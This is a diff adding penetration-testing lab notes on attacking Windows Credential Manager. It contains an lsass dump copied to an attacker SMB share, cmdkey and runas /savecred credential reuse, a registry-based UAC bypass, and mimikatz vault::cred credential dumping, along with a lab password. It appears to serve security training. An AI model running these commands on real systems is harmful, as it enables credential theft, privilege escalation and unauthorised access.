@@ -80,3 +80,64 @@ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rocky
 impacket-smbserver share $(pwd) -smb2support
 copy lsass.dmp \\192.168.31.141\share\lsass.dmp
 ```
+
+# Attacking Windows Credential Manager
+These are the vaults
+- `%UserProfile%\AppData\Local\Microsoft\Vault\`
+- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
+- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
+- `%ProgramData%\Microsoft\Vault\`
+- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
+Each vault contains a `policy.vpol` file with AES Keys protected by DPAPI.
+
+Found in Control Panel->User Accounts->Credential Manager
+Much like the `LSASS` dump, one can do the same thing and dump the key manager.
+```powershell
+C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
+```
+
+#### Enumerating credentials with cmdkey
+```Powershell
+C:\Users\sadams>whoami
+srv01\sadams
+
+C:\Users\sadams>cmdkey /list
+
+Currently stored credentials:
+
+Target: WindowsLive:target=virtualapp/didlogical
+Type: Generic
+User: 02hejubrtyqjrkfi
+Local machine persistence
+
+Target: Domain:interactive=SRV01\mcharles
+Type: Domain Password
+User: SRV01\mcharles
+```
+
+|Key|Value|
+|---|---|
+|Target|The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.|
+|Type|The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.|
+|User|The user account associated with the credential.|
+|Persistence|Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots.|
+### Attacking the SRV
+```cmd-session
+C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
+```
+
+#### Exercise
+1. RDP into the machine `xfreerdp /u:sadams /p:”totally2brow2harmon@” /v:<IP>`
+2. `cmdkey /list`
+3. `runas /user:SRV01\mcharles /savecred cmd`
+4. `whoami`
+5. `reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe`
+6. Create a drive to grab your mimikatz `xfreerdp /u:sadams /p:"totally2brow2harmon@" /v:10.129.234.171 /drive:share,/home/<USER>/mimikatz`
+7. Put into the user's folder then copy `copy C:\Users\sadams\mimikatz.exe.exe C:\Users\Administrator\`
+8. Run Mimikatz
+```shell
+mimikatz.exe
+privilege::debug  
+vault::cred
+```
+CREDENTIALS FOUND!
